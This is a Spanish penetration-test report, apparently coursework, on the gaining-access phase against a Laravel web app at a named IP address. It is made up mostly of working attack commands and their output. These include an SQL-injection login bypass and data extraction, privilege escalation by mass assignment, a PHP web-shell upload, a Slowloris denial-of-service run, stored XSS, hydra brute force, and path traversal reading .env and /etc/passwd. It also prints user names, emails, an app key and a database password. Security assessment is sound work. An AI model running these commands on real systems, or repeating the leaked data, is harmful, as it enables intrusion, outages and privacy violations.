# Fase 3 - Obtención de Acceso (Gaining Access)

**Fase PTES:** Explotación de vulnerabilidades para ingresar al sistema.
**Target:** http://37.60.230.11

---

## Resumen de ataques

| # | Vulnerabilidad | Técnica | Estado | Fecha |
|---|---------------|---------|--------|-------|
| 1 | SQL Injection | Error-based PostgreSQL | ✅ Verificado | 2026-07-12 |
| 2 | Mass Assignment | PATCH role_name | ✅ Verificado | 2026-07-12 |
| 3 | File Upload → RCE | curl multipart | ✅ Verificado | 2026-07-12 |
| 4 | DDoS | slowhttptest | ✅ Verificado | 2026-07-12 |
| 5 | XSS Almacenado | curl PATCH bio | ✅ Verificado | 2026-07-12 |
| 6 | IDOR | curl sin auth | ✅ Verificado | 2026-07-12 |
| 7 | No Rate Limit | bash loop | ✅ Verificado | 2026-07-12 |
| 8 | LFI | curl path traversal | ✅ Verificado | 2026-07-12 |
| 9 | Debug Mode | curl trigger error | ✅ Verificado | 2026-07-12 |

---

## 1. SQL Injection (A03:2021 - Injection)

**Vulnerabilidad:** Inyección SQL en el parámetro `login` del formulario de autenticación (`LoginRequest.php:46`). La consulta interpola directamente el valor del campo `login` sin parametrizar:
```php
$sql = "SELECT * FROM users WHERE $field = '$login' AND is_active = true LIMIT 1";
$users = DB::select($sql);
```

**Comandos verificados:**
```bash
# Paso 1: Obtener CSRF token
TOKEN=$(curl -s -c cookies.txt "http://37.60.230.11/login" | grep -oP 'name="_token" value="\K[^"]+')
echo "TOKEN: $TOKEN"

# Paso 2: Bypass de login
curl -s -X POST "http://37.60.230.11/login" \
  -b cookies.txt -c cookies.txt \
  -d "_token=$TOKEN&login=admin'+OR+'1'%3D'1'+--&password=x"

# Paso 3: Verificar dashboard
curl -b cookies.txt "http://37.60.230.11/admin/dashboard" | grep -oP 'Dashboard'
```

**Salida esperada:**
```
TOKEN: abc123...
HTTP 302 redirect → /dashboard
Dashboard (encontrado en HTML)
```

**Extracción de datos vía error-based (CAST AS NUMERIC):**
```bash
# Versión de PostgreSQL
TOKEN=$(curl -s -c /tmp/j1.txt http://37.60.230.11/login | grep -oP '_token" value="\K[^"]+')
curl -s -b /tmp/j1.txt -X POST http://37.60.230.11/login \
  --data "login=admin' AND 1=CAST((CHR(113)||CHR(120)||CHR(120)||CHR(107)||CHR(113))||(SELECT version())::text||(CHR(113)||CHR(113)||CHR(112)||CHR(98)||CHR(113)) AS NUMERIC)-- -&password=x&_token=$TOKEN" | grep -oP 'qxxkq\K[^<]*?(?=qqpbq)'
```

**Usuarios extraídos:**
```
1 | KEYSI JEANPIERRE BARDALES VASQUEZ | bvasquezkeysije@uss.edu.pe
2 | DELGADO GARCIA BRIGGITTE LUCERO   | dgarciabriggitl@uss.edu.pe
3 | VASQUEZ QUISPE JORGE TOMAS        | vquispejorgetom@uss.edu.pe
4 | CAPITAN LEON GRABIEL ALEXANDER    | cleonalexandgra@uss.edu.pe
5 | ADMINISTRADOR                      | admin@gmail.com
```

---

## 2. Mass Assignment (A01:2021 - Broken Access Control)

**Vulnerabilidad:** `ProfileController::update()` acepta `role_name` sin validación (`ProfileController.php:33-35`).

**Comandos verificados:**
```bash
# Paso 1: Login SQLi
TOKEN=$(curl -s -c cookies.txt "http://37.60.230.11/login" | grep -oP 'name="_token" value="\K[^"]+')
curl -s -X POST "http://37.60.230.11/login" -b cookies.txt -c cookies.txt \
  -d "_token=$TOKEN&login=admin'+OR+'1'%3D'1'+--&password=x" -o /dev/null

# Paso 2: Obtener token y email del perfil
PAGINA=$(curl -s -b cookies.txt "http://37.60.230.11/profile")
TOKEN2=$(echo "$PAGINA" | grep -oP 'name="_token" value="\K[^"]+' | head -1)
EMAIL=$(echo "$PAGINA" | grep -oP 'email" type="email" value="\K[^"]+')

# Paso 3: Escalar a admin
curl -s -X POST "http://37.60.230.11/profile" -b cookies.txt \
  -d "_token=$TOKEN2&_method=PATCH&name=KEYSI+JEANPIERRE+BARDALES+VASQUEZ&email=$EMAIL&role_name=admin"

# Paso 4: Verificar
curl -b cookies.txt "http://37.60.230.11/admin/usuarios" | grep -oP '(Guardar|Crear usuario)'
```

---

## 3. File Upload → RCE (A03:2021 - Injection)

**Vulnerabilidad:** `POST /upload` sin validación de extensión (`routes/web.php:93-103`).

**Comandos verificados:**
```bash
# Crear shell
echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php

# Obtener CSRF
TOKEN=$(curl -s -c cookies.txt "http://37.60.230.11/login" | grep -oP 'name="_token" value="\K[^"]+')

# Subir shell
curl -s -X POST "http://37.60.230.11/upload" \
  -b cookies.txt \
  -F "_token=$TOKEN" \
  -F "file=@/tmp/shell.php"

# Ejecutar comandos
curl "http://37.60.230.11/uploads/shell.php?cmd=id"
curl "http://37.60.230.11/uploads/shell.php?cmd=cat+../.env"
```

**Salida:**
```
{"success":true,"path":"/uploads/shell.php"}
uid=82(www-data) gid=82(www-data) groups=82(www-data)
```

---

## 4. DDoS (Slowloris)

**Vulnerabilidad:** Sin límite de conexiones simultáneas.

**Comandos verificados:**
```bash
# Slowloris: mantener 300 conexiones abiertas
slowhttptest -c 300 -H -g -o Reports/slowhttp \
  -i 10 -r 200 -t GET -u "http://37.60.230.11/" \
  -x 24 -p 5

# En otra terminal, verificar disponibilidad
curl -s -o /dev/null -w "%{http_code}\n" "http://37.60.230.11/"
```

---

## 5. XSS Almacenado (A03:2021 - Injection)

**Vulnerabilidad:** Campo `bio` en perfil se renderiza con `{!! $user->bio !!}` (raw output). El código en `ProfileController.php:32` setea `bio = $request->input('bio')` sin sanitizar.

**Comandos verificados:**
```bash
# Paso 1: Login
TOKEN=$(curl -s -c cookies.txt "http://37.60.230.11/login" | grep -oP 'name="_token" value="\K[^"]+')
curl -s -X POST "http://37.60.230.11/login" -b cookies.txt -c cookies.txt \
  -d "_token=$TOKEN&login=admin'+OR+'1'%3D'1'+--&password=x" -o /dev/null

# Paso 2: Token y email
PAGINA=$(curl -s -b cookies.txt "http://37.60.230.11/profile")
TOKEN2=$(echo "$PAGINA" | grep -oP 'name="_token" value="\K[^"]+' | head -1)
EMAIL=$(echo "$PAGINA" | grep -oP 'email" type="email" value="\K[^"]+')

# Paso 3: Inyectar XSS en bio
curl -s -X POST "http://37.60.230.11/profile" -b cookies.txt \
  -d "_token=$TOKEN2&_method=PATCH&name=KEYSI+JEANPIERRE+BARDALES+VASQUEZ&email=$EMAIL&bio=<script>alert(document.cookie)</script>"

# Paso 4: Verificar
curl -s -b cookies.txt "http://37.60.230.11/profile" | grep -oP 'alert\(document\.cookie\)'
```

**Payload:**
```html
<script>alert(document.cookie)</script>
```

---

## 6. IDOR (A01:2021 - Broken Access Control)

**Vulnerabilidad:** `GET /api/sales/{id}` sin autenticación. `routes/web.php:74-77`.

**Comandos verificados:**
```bash
# Sin autenticación, acceder a ventas
curl -s "http://37.60.230.11/api/sales/121" | python3 -m json.tool | head -15
curl -s "http://37.60.230.11/api/sales/122" | python3 -m json.tool | head -15
curl -s "http://37.60.230.11/api/sales/240" | python3 -m json.tool | head -15
```

**Salida (IDs 121-240, 120 registros accesibles sin auth):**
```json
{ "id": 121, "client_id": 55, "total": "360.00", "document_type": "factura", ... }
{ "id": 122, "client_id": 29, "total": "361.40", "document_type": "boleta", ... }
```

---

## 7. No Rate Limit (A01:2021 - Broken Access Control)

**Vulnerabilidad:** Login sin límite de intentos. Sin throttle middleware.

**Comandos verificados:**
```bash
# 30 requests en paralelo
time for i in $(seq 1 30); do
  curl -s -X POST "http://37.60.230.11/login" \
    -d "_token=x&login=test$i&password=wrong$i" -o /dev/null &
done
wait

# Con hydra
hydra -l admin -P /usr/share/wordlists/rockyou.txt 37.60.230.11 \
  http-post-form "/login:login=^USER^&password=^PASS^:Location: /login" -t 64 -V
```

---

## 8. LFI (A01:2021 - Broken Access Control)

**Vulnerabilidad:** `GET /download?file=` sin sanitizar path traversal (`routes/web.php:79-89`).

**Comandos verificados:**
```bash
# .env con credenciales
curl -s "http://37.60.230.11/download?file=../.env"

# /etc/passwd
curl -s "http://37.60.230.11/download?file=../../../../../../etc/passwd"
```

**Salida (.env):**
```
APP_NAME="Sistema PlazaMoyobanba"
APP_DEBUG=true
APP_KEY=base64:qzEFw0Px3WNRw3oLkc/+QxJdqopufn328GR/XYDC7n8=
DB_PASSWORD=plaza_pass_123
```

---

## 9. Debug Mode (A07:2021 - Security Misconfiguration)

**Vulnerabilidad:** `APP_DEBUG=true` en .env. Laravel muestra stack traces completos.

**Comandos verificados:**
```bash
# Forzar error enviando array en lugar de string
curl -s "http://37.60.230.11/download?file[]=test"

# Ruta inexistente
curl -s "http://37.60.230.11/ruta-inexistente-12345" | grep -oP '(Laravel [0-9]+\.[0-9]+|PHP [0-9]+\.[0-9]+)'
```

**Salida (Laravel con APP_DEBUG=true):**
```
ErrorException - Internal Server Error
Array to string conversion

PHP 8.2.32
Laravel 12.58.0

Stack Trace:
0 - routes/web.php:81
1 - vendor/laravel/framework/src/Illuminate/Routing/CallableDispatcher.php:39

Database Queries:
* pgsql - select * from "sessions" where "id" = '...' limit 1 (27.38 ms)
```
